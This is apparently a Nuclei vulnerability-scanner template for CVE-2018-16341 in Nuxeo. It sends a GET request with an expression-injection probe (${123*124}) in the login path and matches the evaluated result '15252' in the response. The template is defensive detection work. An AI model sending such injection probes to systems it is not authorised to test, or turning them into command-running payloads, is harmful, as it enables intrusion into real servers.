id: nuxeo-rce-cve-2018-16341
info:
  name: Nuxeo Remote Code Execution
  author: ProjectDiscoveryAI
  severity: high
  tags: rce,cve-2018-16341
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-16341

http:
  - method: GET
    path:
      - "/nuxeo/login.jsp/$%7B123*124%7D.xhtml"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "15252.xhtml"
        part: body
      - type: word
        words:
          - "ERROR"
        part: body
